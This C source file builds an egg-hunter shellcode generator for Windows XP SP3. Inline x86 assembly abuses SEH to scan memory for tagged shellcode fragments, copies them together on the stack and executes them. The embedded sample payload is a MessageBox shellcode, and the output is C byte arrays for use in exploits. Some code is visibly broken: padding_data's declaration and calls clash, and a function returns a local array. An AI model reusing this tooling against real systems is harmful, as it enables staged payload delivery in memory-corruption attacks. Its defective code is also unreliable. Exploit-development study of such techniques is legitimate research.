/* 
	Test on Win xp sp3


 egg struct:

    ------------------------------------------------------------
	|	1 byte   |    1 byte   |  3 bytes   |   egg_size bytes |
	------------------------------------------------------------
	|   EggSize  |   EggIndex  |   EggMark  |     EggData      |


e.g.:
	
	unsigned char egg_1[] = "\x03" "\xFF" "\x11\x22\x33" "\x90\x90\x90";
	unsigned char egg_2[] = "\x03" "\xFE" "\x11\x22\x33" "\x90\x90\x90";
	unsigned char egg_3[] = "\x03" "\xFD" "\x11\x22\x33" "\x90\x90\xcc";
	
	size(egg_1) = 0x03
	size(egg_2) = 0x03
	size(egg_3) = 0x03

	index(egg_1) = 0xFF ^ 0xFF = 0
	index(egg_2) = 0xFF ^ 0xFE = 1
	index(egg_3) = 0xFF ^ 0xFD = 2

	mark(egg_1) = mark(egg_2) = mark(egg_3) = "\x11\x22\x33"

	data(egg1)  = "\x90\x90\x90"
	data(egg2)  = "\x90\x90\x90"
	data(egg3)  = "\x90\x90\xcc"
	
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


#define EggMark				0x332211	//change if needed
#define MaxSearchMem		0x01010101	//change if needed, may upto 0x7FFFFFFF
#define EggHuntCodeMark		0xCC		//change if needed

#define EggSize				0x20		//change if needed
#define MaxIndex			0x3			//it depends on shellcode's size and EggSize


/* messagebox shellcode*/
unsigned char shellcode[] =
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7"
"\x68\x72\x6c\x64\x01"
"\x68\x6f\x20\x57\x6f"
"\x68\x48\x65\x6c\x6c"
"\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff\xd7";




//################################################################################//

void egg_hunt_code();
unsigned char * padding_data(unsigned char *data, int align);
unsigned char * out_C_format(unsigned char* data,int len, char* out_title,int align);
unsigned char * genEggHuntCode(unsigned char *code_addr, unsigned char mark);
unsigned char ** genEggCode(unsigned char *shellcode,unsigned char padding,int eggsize);

int main(int argc, char **argv) {
	int i;
	char buf[1024];
	int len;
	unsigned char *HuntEggCode = NULL;
	unsigned char **EggCodeArry = NULL;
	
	HuntEggCode = genEggHuntCode(egg_hunt_code,EggHuntCodeMark);
	memset(buf,0,1024);
	len = strlen(HuntEggCode);
	sprintf(buf,"unsigned char ShellcodeHunt[%d]=",len);
	out_C_format(HuntEggCode,len,buf,16);

	EggCodeArry = genEggCode(shellcode,0x90,EggSize);
	for(i=0;i<=MaxIndex;i++){
		memset(buf,0,1024);
		sprintf(buf,"unsigned char code_%d[%d]=",i,EggSize+5);
		out_C_format(EggCodeArry[i],EggSize+5,buf,16);
		
	}

	return (0);
}



//##########################################################################//


static void __declspec(naked) egg_hunt_code() {

	__asm{
	
	start_egg_hunt:
		XOR     EDI, EDI
		JMP     search_again

	setup_seh_handler:
		PUSH    ECX                         ; EXCEPTION_REGISTRATION[0].next == 0xFFFFFFFF
		MOV     DWORD PTR FS:[EAX], ESP     ; seh_chain -> EXCEPTION_REGISTRATION[0]
		CLD                                 

	scan_egg_code:
		MOV     AL, EggSize	                ; EAX保存每一个egg大小
		REPNE   SCASB						; 每次读取edi指向的内存的1字节，如果[EDI] = EAX = EggSize则停止 
		PUSH    EAX                         ; 保存egg_size
		MOV     ESI, EDI
		LODSD                               ; EAX = EggIndex|EggMark
		XOR     EAX, (EggMark << 8) + 0xFF	; EDX = (EggIndex|EggMark) ^ (0xFF|EggMark) == EggIndex
		CMP     EAX,MaxIndex				; EDX > MaxIndex
		JA      search_again				; 标示mark不正确,则继续搜索
		POP     ECX                         ; ECX = EggSize
		IMUL    ECX                         ; EAX = EggSize * EggIndex == EggOffset，egg在全部shellcode代码中的偏移地址
		;XOR	EDX,EDX
		ADD     EAX,DWORD PTR FS:[EDX + 8]	; EDI += 栈顶FS:[0x08] == egg在内存中的相对虚拟内存地址
		XCHG    EAX, EDI

	copy_egg_code:
		REP     MOVSB                       ; 将egg拷贝到目标地址
		MOV     EDI, ESI                    ; EDI指向当前egg数据的末尾
		;JMP	scan_egg_code


	search_again:
		XOR     EAX, EAX                    ; EAX = 0
		MOV     ECX, DWORD PTR FS:[EAX]		; EBX = seh_chain => EXCEPTION_REGISTRATION[X]


	search_last_seh:
		MOV     ESP, ECX                    ; ESP = EXCEPTION_REGISTRATION[X]
		POP     ECX                         ; EBX = EXCEPTION_REGISTRATION[X].next
		CMP     ECX, 0xFFFFFFFF             ; EXCEPTION_REGISTRATION[X].next == 0xFFFFFFFF
		JNE     search_last_seh          
		POP     EDX                         ; EDX = EXCEPTION_REGISTRATION[0].handler
		CALL    setup_seh_handler			; EXCEPTION_REGISTRATION[0].handler == egg_hunt_seh_handler


	egg_hunt_seh_handler:
		POPAD                               ; equ POP ESI;POP ESI ; ESI = [ESP + 4] -> struct EXCEPTION_RECORD
		LEA     ESP,DWORD PTR [ESI+0x18]	; ESP = struct EXCEPTION_RECORD->ExceptionInformation
		POP     EAX                         ; EAX指向异常读取地址
		OR      AX, 0x0FFF                  
		INC     EAX							; EAX指向下一内存页面         
		CMP		EAX,MaxSearchMem			
		JA      exec_shellcode              ; EAX > MaxSearchMem 则表示搜索完毕，执行exec_shellcode
		XCHG    EAX, EDI                    ; EDI指向下一内存页面
		JMP     search_again


	exec_shellcode:
		XOR     EAX, EAX                    ; EAX = 0
		CALL    FS:[EAX + 8]				; FS:[0x08]保存线程堆栈的栈顶，即esp允许的最小值

	}

	//egg hunt code结束标志
	__asm{_emit EggHuntCodeMark}	//egg hunt code ending mark

}



unsigned char * genEggHuntCode(unsigned char *code_addr, unsigned char mark){

	int len = 0;
	unsigned char egg_hunt_code[1024] = {'0'};
	unsigned char *p = code_addr;
	while(*p != mark){
		if(*p == NULL){
			printf("EggHuntCode contains NULL byte! Null byte Offset:[%d]\n",len);
			exit(0);			
		}
		egg_hunt_code[len++] = *p;
		p++;
		if(len > 1024) {
			printf("EggHuntCode is too large!!\n");
			exit(0);
		}
	}
	egg_hunt_code[len] = '\x00';
	return egg_hunt_code;

}


unsigned char ** genEggCode(unsigned char *shellcode,unsigned char padding,int eggsize){
	int i;
	int len;
	int max_index;
	unsigned char** EggCodeArry;
	unsigned char* newshellcode;

	newshellcode = padding_data(shellcode,padding,eggsize);
	len = strlen(newshellcode);
	max_index = len / eggsize - 1;
	if(max_index != MaxIndex){
		printf("\n\ncurrent max egg index is %d\n",max_index);
		printf("\nplease change \"#define MaxIndex %d\"\n\n",max_index);
		exit(0);
	}
	EggCodeArry = (unsigned char**)malloc((max_index+1) * sizeof(unsigned char*));
	for(i=0;i<=max_index;i++){
		EggCodeArry[i] = (unsigned char*)malloc(5 + eggsize + 1);
		EggCodeArry[i][0] = eggsize;
		EggCodeArry[i][1] = i ^ 0xFF;
		EggCodeArry[i][2] = EggMark&0xFF;
		EggCodeArry[i][3] =	(EggMark>>8)&0xFF;
		EggCodeArry[i][4] = (EggMark>>16)&0xFF;
		strncpy(EggCodeArry[i]+5,newshellcode+i*eggsize,eggsize);
		EggCodeArry[i][5+eggsize] = '\x00';
	}
	
	return EggCodeArry;
}




unsigned char * padding_data(unsigned char *data, unsigned char padding, int align){
	int i,len,r;
	char *newdata;
	len = strlen(data);
	
	if(len == 0){
		printf("no data!\n");
		exit(0);
	}
	if(align == 0){
		printf("no align input!\n");
		exit(0);
	}	
	if(0<(r=len%align)){
		newdata = malloc(len+align-r+1);
		strcpy(newdata,data);
		for(i = 0;i<align-r;i++){
			newdata[len+i] = padding;
		}
		newdata[len+align-r] = '\x00';
		return newdata;
	}
	return data;
}


unsigned char * out_C_format(unsigned char* data,int len,char* out_title,int align){
	int i;
	//printf("data contains %d bytes!\n",len);
	printf("\n%s\n\"",out_title);
	for(i=0;i<len;i++){
		printf("\\x%02x",data[i]);
		if((i+1)%align == 0 && (i+1)!=len){
			printf("\"\n\"");
		}
	}
	printf("\";\n");
	return NULL;
}
